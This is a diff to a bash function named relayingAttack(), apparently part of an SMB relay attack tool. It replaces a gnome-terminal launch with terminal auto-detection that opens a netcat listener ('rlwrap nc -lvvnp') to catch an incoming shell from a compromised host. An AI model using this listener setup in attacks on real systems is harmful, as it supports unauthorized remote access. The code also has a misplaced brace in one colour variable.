@@ -208,8 +208,24 @@ function relayingAttack(){
 
 
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
-  gnome-terminal --window --hide-menubar -e "rlwrap nc -lvvnp $lport" > /dev/null 2>&1 &
-  gnome_nc_PID=$!
+  terminal='xterm'
+  for ps in $(ps ax | awk '{print $5}' | sort -u | grep -v "\[\|\/" | awk -F- '{print $1}'); do
+    tput -T $ps longname &>/dev/null
+    if [ $? -eq 0 ];then terminal=$ps; break; fi
+  done
+
+  command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport'"
+  if [ $terminal == "xterm" ];then
+    xterm -hold -e "$command" &>/dev/null &
+  elif [ $terminal == "gnome" ];then
+    gnome-terminal --window --hide-menubar -e "$command" &> /dev/null &
+  elif [ $terminal == "termite" ];then
+    termite -hold -e "$command" &>/dev/null &
+  else
+    echo -e "${redColour}[D:]$endColour} Unable to locate terminal in the system. Existing...\n"; tput cnorm; exit 1
+  fi
+
+  terminal_nc_PID=$!
 
   sleep 5
 
